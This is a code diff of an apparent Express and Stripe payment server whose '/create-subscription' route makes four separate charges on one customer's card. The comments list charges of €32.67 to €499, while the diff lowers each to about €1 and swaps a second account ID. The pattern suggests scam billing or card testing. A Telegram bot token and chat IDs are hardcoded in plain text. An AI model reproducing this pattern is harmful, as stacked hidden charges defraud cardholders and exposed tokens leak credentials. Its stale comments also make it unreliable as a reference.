@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1SmLNn4ZnerSAS1Kf';
+const ACCOUNT_B = 'acct_1T2k6b2LILyPbyld';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -115,7 +115,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 1 — €32.67
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 3267,
+        amount: 167,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -135,7 +135,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 2 — €199
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 19900,
+        amount: 102,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -155,7 +155,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 49900,
+        amount: 100,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -175,7 +175,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 4 — €399
     try {
       const payment4 = await stripe.paymentIntents.create({
-        amount: 39900,
+        amount: 140,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
